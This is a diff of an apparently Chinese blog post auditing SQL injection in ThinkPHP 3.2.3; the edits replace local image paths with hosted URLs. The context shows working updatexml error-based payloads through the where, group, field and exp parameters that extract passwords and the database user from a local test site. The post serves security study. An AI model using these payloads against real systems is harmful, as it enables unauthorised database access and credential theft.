@@ -507,7 +507,7 @@
 <p>了解tp3的路由格式:</p>
 <pre><code>http://easy.test/easy201020/thinkphp_3.2.3_full/index.php/Home/Index/index
                                                             模块/控制器/方法</code></pre><p>使用上面的路由成功访问到tp3的欢迎界面就表示成功了:</p>
-<p><img src="C:%5CUsers%5CEASY%5CDesktop%5Cimgimage-20201208165651928.png" alt=""></p>
+<p><img src="https://picbed.easy233.top//imgimgimage-20201208165651928.png" alt=""></p>
 <h2 id="find和select方法注入"><a href="#find和select方法注入" class="headerlink" title="find和select方法注入"></a>find和select方法注入</h2><p>这个两个函数的代码非常类似，并且payload也是一样通用的，这里选择find函数进行讲解。</p>
 <p>首先<code>Application/Home/Controller/IndexController.class.php</code>文件中创建我们的demo代码</p>
 <pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -517,7 +517,7 @@
     <span class="token punctuation">}</span></code></pre>
 <p>先使用我们payload打一下看看效果:</p>
 <pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//easy.test/easy201020/thinkphp_3.2.3_full/index.php/Home/Index/test?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23</span></code></pre>
-<p><img src="C:%5CUsers%5CEASY%5CDesktop%5Cimgimage-20201208170701883.png" alt=""></p>
+<p><img src="https://picbed.easy233.top//imgimgimage-20201208170701883.png" alt=""></p>
 <p>可以看到正常注入获取到了数据，首先我们要明确tp3的db底层就是字符的拼接如果对于数据过滤不严格，那么一定会存在sql注入漏洞。没有问题后我们开始来分析代码。</p>
 <h3 id="I-input-方法"><a href="#I-input-方法" class="headerlink" title="I(input)方法"></a>I(input)方法</h3><p>其实从官方文档我们可以知道如果<code>I()</code>方法不存在过滤参数的话会默认使用<code>htmlspecialchars</code>方法进行过滤，但是同时默认使用的<code>htmlspecialchars</code>函数并没有过滤<code>&#39;</code>的，这些小细节我们在代码审计中的时候要牢记于心。</p>
 <p>我还是更进该函数去看看是怎么写的：文件在于<code>ThinkPHP/Common/functions.php</code></p>
@@ -577,7 +577,7 @@
         <span class="token punctuation">}</span>
     <span class="token punctuation">}</span></code></pre>
 <p>可以清晰看到这里对数据进行强制数据类型转换，然后放回。进行数据类型转换后自然是不存在sql注入，我们需要绕过这个函数的过滤。</p>
-<p>认真看我们可以发现只有经过下面这个判断才会进入<code>_parseType</code>函数过滤，稍微细心一点同学都应该能够发现该判断使用数组可以随便绕过。先不说其他判断条件，一个<code>is_array($options[&#39;where&#39;])</code>就可以让所有的一维数组绕过去。<img src="C:%5CUsers%5CEASY%5CDesktop%5Cimgimage-20201208185335543.png" alt=""></p>
+<p>认真看我们可以发现只有经过下面这个判断才会进入<code>_parseType</code>函数过滤，稍微细心一点同学都应该能够发现该判断使用数组可以随便绕过。先不说其他判断条件，一个<code>is_array($options[&#39;where&#39;])</code>就可以让所有的一维数组绕过去。<img src="https://picbed.easy233.top//imgimgimage-20201208185335543.png" alt=""></p>
 <p>继续向下读:</p>
 <p>可以看到其执行语句的方法:</p>
 <pre class=" language-php"><code class="language-php">  <span class="token variable">$resultSet</span>   <span class="token operator">=</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
@@ -616,7 +616,7 @@
 <p>笔者测试下面几个,有兴趣可以继续参试:</p>
 <pre class=" language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token punctuation">[</span>group<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select password from users limit <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
 <span class="token operator">?</span>id<span class="token punctuation">[</span>field<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select password from users limit <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre>
-<p><img src="C:%5CUsers%5CEASY%5CDesktop%5Cimgimage-20201208191759811.png" alt=""></p>
+<p><img src="https://picbed.easy233.top//imgimgimage-20201208191759811.png" alt=""></p>
 <h2 id="delete-方法注入"><a href="#delete-方法注入" class="headerlink" title="delete()方法注入"></a>delete()方法注入</h2><p>delete()注入整个过程细节都和上面的find，select方法差不多，只有一处地方需要注意一下:</p>
 <p>在<code>ThinkPHP/Mode/Lite/Model.class.php</code>delete方法处，前面的处理和前面的都一样只是在下面多了一个:</p>
 <pre class=" language-php"><code class="language-php">        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
@@ -625,7 +625,7 @@
         <span class="token punctuation">}</span>     </code></pre>
 <p>数组中必须要存在<code>where</code>数组</p>
 <p>其他没什么特别的了，直接附上payload:</p>
-<pre><code>http://easy.test/easy201020/thinkphp_3.2.3_full/index.php/Home/Index/test?id[where]=1 and updatexml(&#39;~&#39;,concat(1,user(),1),&#39;~&#39;)</code></pre><p><img src="C:%5CUsers%5CEASY%5CDesktop%5Cimgimage-20201209094456623.png" alt=""></p>
+<pre><code>http://easy.test/easy201020/thinkphp_3.2.3_full/index.php/Home/Index/test?id[where]=1 and updatexml(&#39;~&#39;,concat(1,user(),1),&#39;~&#39;)</code></pre><p><img src="https://picbed.easy233.top//imgimgimage-20201209094456623.png" alt=""></p>
 <h2 id="exp注入"><a href="#exp注入" class="headerlink" title="exp注入"></a>exp注入</h2><p>首先修改我们的环境:</p>
 <pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -637,7 +637,7 @@
 <p>这里也是使用了find方法进行查询，但很明显的一点就是传入的值一开始就是一个数组，这种情况在实际中很常见，并且这里使用原生的GET来传输数据而不是thinkphp提供的<code>I</code>方法，这个原因在后面会讲解。</p>
 <p>payload:</p>
 <pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//easy.test/easy201020/thinkphp_3.2.3_full/index.php/Home/Index/test?user[0]=exp&amp;user[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)</span></code></pre>
-<p><img src="C:%5CUsers%5CEASY%5CDesktop%5Cimgimage-20201209113015632.png" alt=""></p>
+<p><img src="https://picbed.easy233.top//imgimgimage-20201209094456623.png" alt=""></p>
 <p>我们首先更进<code>where</code>方法看看,如下图因为$where是数组而整个<code>where</code>方法其实并没有对该数组什么特别的操作，只是在最后把<code>$where</code>数组赋值给了<code>$options</code>数组。</p>
 <p><img src="https://picbed.easy233.top//imgimage-20201209102754850.png" alt=""></p>
 <p>而<code>find</code>方法在前面的已经分析过了并不会对该数组进行过滤，咱们直接看看核心的<code>select</code></p>
